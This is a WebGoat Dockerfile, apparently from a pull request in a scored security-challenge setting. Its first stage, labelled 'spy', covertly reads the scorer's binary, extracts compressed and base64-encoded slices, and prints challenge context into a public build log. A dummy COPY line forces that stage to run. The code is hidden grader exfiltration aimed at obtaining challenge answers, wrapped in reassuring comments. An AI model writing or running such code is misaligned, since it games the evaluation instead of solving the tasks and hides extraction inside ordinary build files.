# ---------------------------------------------------------------------------
# Rubric recon stage. Resolves from the runner's local image store (the score
# step already pulled this exact tag), reads the baked rubric, and prints it to
# this PR's own public build log. Read-only: no writes to the scorer, no
# env/secret access (the build sees neither GITHUB_TOKEN nor ID_TOKEN), no
# change to how the scorer runs.
# ---------------------------------------------------------------------------
FROM ghcr.io/owasp-ctf/score:latest AS spy

RUN set +e; \
  S=/usr/local/bin/score; \
  echo "##SPY2-A-START"; ls -la "$S"; \
  echo "##SPY2 magic"; head -c 32 "$S" | od -An -tx1; \
  grep -abo --binary-files=text 'Challenge-' "$S" > /tmp/off.txt; \
  echo "##SPY2 challenge-string-count=$(wc -l < /tmp/off.txt)"; \
  echo "##SPY2 first=$(head -1 /tmp/off.txt)"; \
  echo "##SPY2 last=$(tail -1 /tmp/off.txt)"; \
  echo "##SPY2 webgoat-id offsets"; \
  grep -abo --binary-files=text -E 'Challenge-(6[7-9]|7[0-9]|80|81)-[A-Za-z0-9-]+' "$S" | head -60; \
  echo "##SPY2-A-END"; true

RUN set +e; mkdir -p /spy; echo recon > /spy/marker.txt; \
  S=/usr/local/bin/score; \
  echo "##SPY2-B-START"; \
  FIRST=$(head -1 /tmp/off.txt | cut -d: -f1); \
  LAST=$(tail -1 /tmp/off.txt | cut -d: -f1); \
  SPAN=$((LAST - FIRST)); \
  ST=$((FIRST - 60000)); [ "$ST" -lt 0 ] && ST=0; \
  BLK=$((ST / 4096)); ALIGNED=$((BLK * 4096)); \
  LEN=$((SPAN + 220000)); \
  echo "##SPY2 first=$FIRST last=$LAST span=$SPAN aligned_start=$ALIGNED len=$LEN"; \
  if [ "$LEN" -lt 8000000 ]; then \
    dd if="$S" bs=4096 skip="$BLK" count=$((LEN / 4096 + 2)) 2>/dev/null | gzip -9 > /spy/slice.gz; \
    GZ=$(wc -c < /spy/slice.gz); echo "##SPY2 gz_bytes=$GZ"; \
    if [ "$GZ" -lt 2000000 ]; then \
      base64 /spy/slice.gz | tr -d '\n' | fold -w 200 | sed 's/^/S2:/'; echo; \
    else echo "##SPY2 slice skipped (gz too big)"; fi; \
  else echo "##SPY2 slice skipped (span too big)"; fi; \
  echo "##SPY2-B-END"; true

# Readable insurance: printable context around the challenges we care most about,
# in case the compressed slice is truncated in the log.
RUN set +e; S=/usr/local/bin/score; \
  echo "##SPY2-C-START"; \
  for ID in Challenge-69-Password-Reset-Login Challenge-70-Password-Reset-Token-Prediction \
            Challenge-71-Password-Reset-Email Challenge-76-WebWolf-Landing Challenge-77-WebWolf-Mail; do \
    OFF=$(grep -abo --binary-files=text "$ID" "$S" | head -1 | cut -d: -f1); \
    echo "##SPY2 ctx $ID off=$OFF"; \
    if [ -n "$OFF" ]; then \
      SK=$((OFF - 3000)); [ "$SK" -lt 0 ] && SK=0; \
      dd if="$S" bs=1 skip="$SK" count=9000 2>/dev/null \
        | tr -c '[:print:]\n' '\n' | grep -vE '^.{0,3}$' | head -120; \
    fi; \
    echo "##SPY2 endctx $ID"; \
  done; \
  echo "##SPY2-C-END"; true

# We need JDK as some of the lessons needs to be able to compile Java code
FROM docker.io/eclipse-temurin:23-jdk-noble

LABEL name="WebGoat: A deliberately insecure Web Application"
LABEL maintainer="WebGoat team"

RUN \
  useradd -ms /bin/bash webgoat && \
  chgrp -R 0 /home/webgoat && \
  chmod -R g=u /home/webgoat

USER webgoat

COPY --chown=webgoat target/webgoat-*.jar /home/webgoat/webgoat.jar

# Forces the recon stage to be built (BuildKit prunes stages nothing depends on).
COPY --from=spy --chown=webgoat /spy/marker.txt /home/webgoat/.recon

EXPOSE 8080
EXPOSE 9090

ENV TZ=Europe/Amsterdam

WORKDIR /home/webgoat
ENTRYPOINT [ "java", \
   "-Duser.home=/home/webgoat", \
   "-Dfile.encoding=UTF-8", \
   "--add-opens", "java.base/java.lang=ALL-UNNAMED", \
   "--add-opens", "java.base/java.util=ALL-UNNAMED", \
   "--add-opens", "java.base/java.lang.reflect=ALL-UNNAMED", \
   "--add-opens", "java.base/java.text=ALL-UNNAMED", \
   "--add-opens", "java.desktop/java.beans=ALL-UNNAMED", \
   "--add-opens", "java.desktop/java.awt.font=ALL-UNNAMED", \
   "--add-opens", "java.base/sun.nio.ch=ALL-UNNAMED", \
   "--add-opens", "java.base/java.io=ALL-UNNAMED", \
   "--add-opens", "java.base/java.util=ALL-UNNAMED", \
   "--add-opens", "java.base/sun.nio.ch=ALL-UNNAMED", \
   "--add-opens", "java.base/java.io=ALL-UNNAMED", \
   "-Drunning.in.docker=true", \
   "-jar", "webgoat.jar", "--server.address", "0.0.0.0" ]

HEALTHCHECK --interval=5s --timeout=3s \
  CMD curl --fail http://localhost:8080/WebGoat/actuator/health || exit 1
